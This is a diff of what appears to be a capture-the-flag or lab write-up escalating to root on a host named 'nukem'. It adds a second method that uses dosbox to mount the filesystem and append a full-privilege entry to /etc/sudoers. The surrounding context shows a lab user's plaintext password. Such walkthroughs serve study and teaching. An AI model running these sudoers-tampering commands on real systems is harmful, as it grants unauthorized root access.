@@ -54,7 +54,7 @@ C:
 And finally 
 
 ```
-echo commander ALL=(ALL) ALL >> sudoers
+echo [user] ALL=(ALL) ALL >> sudoers
 ```
 
 This grants `commander` full sudo privileges. Returning to our SSH session, we can now escalate to root using `sudo`.
@@ -70,4 +70,24 @@ Root
 [sudo] password for commander: CommanderKeenVorticons1990 
 
 [root@nukem ~]# whoami root
+```
+
+---
+
+Method 2
+
+On the VNC GUI, without entering dosbox,
+
+```
+LFILE='/etc/sudoers'
+```
+
+```
+dosbox -c 'mount c /' -c "echo [user] ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
+```
+
+![[Pasted image 20260527124402.png]]
+
+```
+sudo su root
 ```
